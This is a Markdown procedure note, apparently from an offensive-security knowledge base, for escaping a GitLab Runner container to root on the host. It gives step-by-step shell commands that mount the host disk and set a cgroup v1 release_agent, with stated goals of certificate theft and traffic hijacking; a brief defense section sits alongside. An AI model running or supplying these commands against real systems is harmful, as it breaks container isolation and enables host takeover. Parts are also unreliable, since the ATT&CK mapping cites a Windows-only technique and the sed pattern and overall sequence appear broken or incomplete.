---
tags:
  - privilege-escalation
  - cgroup
  - mount
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/mkdir-host-mount-point]]'
  - '[[commands/mount-host-storage-volume]]'
  - '[[commands/setup-cgroup-for-root-execution]]'
  - '[[commands/enable-cgroup-notify-on-release]]'
  - '[[commands/export-host-path-from-mtab]]'
  - '[[commands/set-cgroup-release-agent]]'
platforms:
  - Linux
  - Docker
techniques:
  - '[[Bypass User Account Control]]'
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: a0efde61-2cff-4da7-9957-3a1bba4cbbc0
created_at: '2025-12-14T04:08:48.120Z'
updated_at: '2025-12-14T04:08:48.120Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Bypass User Account Control]]'
  - '[[Command-Line Interface]]'
---
# Mount Host Filesystem and Escalate to Root via Cgroup

## Summary

This procedure mounts the host's storage volume inside the executor container and abuses Linux cgroups to execute commands as root on the host, achieving privilege escalation from the containerized CI job environment.

## Description

GitLab Runners often mount host volumes for persistence, accessible via devices like /dev/sda9. By mounting this in the container, files like Docker certs become readable. To run privileged commands, exploit the memory cgroup's release_agent feature, which allows setting a script to run as root upon process release. This bypasses container isolation, targeting vulnerable cgroup v1 setups common in older Docker environments.

## Requirements

1. Shell access in executor container
2. Host volume mounted read-write (e.g., /dev/sda9)
3. Cgroup v1 enabled (memory controller)
4. Writable /tmp in container

## Defense

Defensive measures and detection strategies:

- Upgrade to cgroup v2 to disable release_agent abuse
- Run runners with AppArmor/SELinux enforcing no new mounts
- Monitor for unexpected cgroup mounts or notify_on_release changes
- Use read-only mounts for host volumes

## Objectives

1. Access host filesystem from container
2. Escalate to root for daemon manipulation
3. Enable certificate extraction and traffic hijacking

## Instructions

### Step 1: Create Mount Point

**Context**: Prepare directory for host volume mount.

**Command** ([[commands/mkdir-host-mount-point]]):
```bash
mkdir /h
```

> Creates /h for mounting; succeeds if directory doesn't exist.

### Step 2: Mount Host Volume

**Context**: Attach host storage to access files like /etc/docker.

**Command** ([[commands/mount-host-storage-volume]]):
```bash
mount /dev/sda9 /h
```

> Mounts /dev/sda9 (adjust device if needed) to /h; verify with ls /h.

### Step 3: Setup Cgroup Hierarchy

**Context**: Mount memory cgroup and create subdir for trigger.

**Command** ([[commands/setup-cgroup-for-root-execution]]):
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

> Establishes cgroup v1 memory controller at /tmp/cgrp/x.

### Step 4: Enable Release Notification

**Context**: Activate trigger for root execution on process release.

**Command** ([[commands/enable-cgroup-notify-on-release]]):
```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```

> Sets flag to run release_agent as root.

### Step 5: Extract Host Path

**Context**: Parse /etc/mtab to find host's perdir for file writes.

**Command** ([[commands/export-host-path-from-mtab]]):
```bash
export host_path=`sed -n 's/.*\perdir=\([^,\]*\).*/\1/p' /etc/mtab`
```

> Uses sed to extract path; echo $host_path to verify.

### Step 6: Set Release Agent

**Context**: Point cgroup to run /cmd script as root on trigger.

**Command** ([[commands/set-cgroup-release-agent]]):
```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

> Configures agent; future triggers execute /cmd on host as root.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Bypass User Account Control]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/mkdir-host-mount-point]]
- [[commands/mount-host-storage-volume]]
- [[commands/setup-cgroup-for-root-execution]]
- [[commands/enable-cgroup-notify-on-release]]
- [[commands/export-host-path-from-mtab]]
- [[commands/set-cgroup-release-agent]]

## Tools Used


## Tags

- privilege-escalation
- cgroup
- mount
